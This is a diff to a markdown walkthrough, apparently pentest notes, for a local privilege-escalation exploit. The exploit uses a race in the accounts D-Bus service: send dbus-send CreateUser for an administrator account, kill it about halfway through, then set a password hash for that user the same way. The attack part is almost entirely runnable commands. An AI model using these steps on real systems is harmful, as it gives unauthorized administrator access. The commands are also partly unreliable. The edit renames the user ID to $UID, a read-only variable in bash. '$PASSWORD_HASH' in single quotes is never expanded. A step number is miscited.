@@ -28,7 +28,15 @@ The race condition is obviously kind of tricky, so best to request something tha
 (0) Construct a message similar to the following:
 
 ```bash
-dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
+dbus-send \
+	--system \
+	--dest=org.freedesktop.Accounts \
+	--type=method_call \
+	--print-reply /org/freedesktop/Accounts \
+	              org.freedesktop.Accounts.CreateUser \
+	              string:attacker \
+	              string:"Pentester Account" \
+	              int32:1
 ```
 
 The three parameters are:
@@ -40,13 +48,30 @@ The three parameters are:
 (1) Begin by determining how long the message takes to execute on the target. This can be done with the `time` command.
 
 ```bash
-time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
+time dbus-send \
+	--system \
+	--dest=org.freedesktop.Accounts \
+	--type=method_call \
+	--print-reply /org/freedesktop/Accounts \
+	              org.freedesktop.Accounts.CreateUser \
+	              string:attacker \
+	              string:"Pentester Account" \
+	              int32:1
 ```
 
 (3) DBus needs to be killed approximately *halfway* through this execution period. We *cannot* wait for the application to return, so instead we background it.
 
 ```bash
-dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep ${TIME}s; kill $!
+dbus-send \
+	--system \
+	--dest=org.freedesktop.Accounts \
+	--type=method_call \
+	--print-reply /org/freedesktop/Accounts \
+	              org.freedesktop.Accounts.CreateUser \
+	              string:attacker \
+	              string:"Pentester Account" \
+	              int32:1 & \
+sleep ${TIME}s; kill $!
 ```
 
 Here `$TIME` is approximately half the time measured in the previous step.
@@ -66,10 +91,18 @@ openssl passwd -6 $PASSWORD
 (6) Pull the same trick as in step 3, but with setting the created user’s password.
 
 ```bash
-dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$USER_ID org.freedesktop.Accounts.User.SetPassword string:'$PASSWORD_HASH' string:'Ask the pentester' & sleep ${TIME}s; kill $!
+dbus-send \
+	--system \
+	--dest=org.freedesktop.Accounts \
+	--type=method_call \
+	--print-reply /org/freedesktop/Accounts/User$UID \
+	              org.freedesktop.Accounts.User.SetPassword \
+	              string:'$PASSWORD_HASH' \
+	              string:'Ask the pentester' & \
+sleep ${TIME}s; kill $!
 ```
 
-Here `$USER_ID` is the user ID retrieved in step 4 (note that there’s *no* space between `User` and the ID, so you’ll be hitting an endpoint that looks something like `/org/freedesktop/Accounts/User1003`), `$PASSWORD_HASH` is the hash returned in step 5, and `$TIME` is the same timing determined from step 3. The second `string`  being passed in the user password hint.
+Here `$UID` is the user ID retrieved in step 4 (note that there’s *no* space between `User` and the ID, so you’ll be hitting an endpoint that looks something like `/org/freedesktop/Accounts/User1003`), `$PASSWORD_HASH` is the hash returned in step 5, and `$TIME` is the same timing determined from step 3. The second `string`  being passed in the user password hint.
 
 (7) Log in as the new user (probably via `su`).
 
